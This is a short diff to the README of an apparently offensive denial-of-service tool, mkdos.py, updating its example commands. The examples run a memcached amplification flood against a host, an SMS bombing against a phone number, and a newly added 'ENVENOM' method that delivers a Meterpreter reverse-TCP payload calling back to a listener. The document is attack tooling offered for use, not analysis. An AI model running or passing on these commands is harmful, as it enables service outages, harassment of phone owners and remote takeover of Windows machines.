@@ -45,6 +45,7 @@ optional arguments:
   --burst_interval <burst_interval>   Interval between packets in seconds
 
 For Example:
-$ sudo python3 dos/mkdos/mkdos.py --method MEMCACHED --time 60 --threads 100 --target 127.0.0.1:80
-$ python3 dos/mkdos/mkdos.py --method SMS --time 30 --threads 50 --target +66123456789
+$ sudo python3 mkdos.py --method MEMCACHED --time 60 --threads 100 --target 127.0.0.1:80
+$ sudo python3 mkdos.py --method SMS --time 30 --threads 50 --target +66123456789
+$ sudo python3 mkdos.py --method ENVENOM --time 30 --threads 50 --target 127.0.0.1:80 --payload windows/x64/meterpreter/reverse_tcp --lhost 127.0.0.1 --lport 4444
 ```
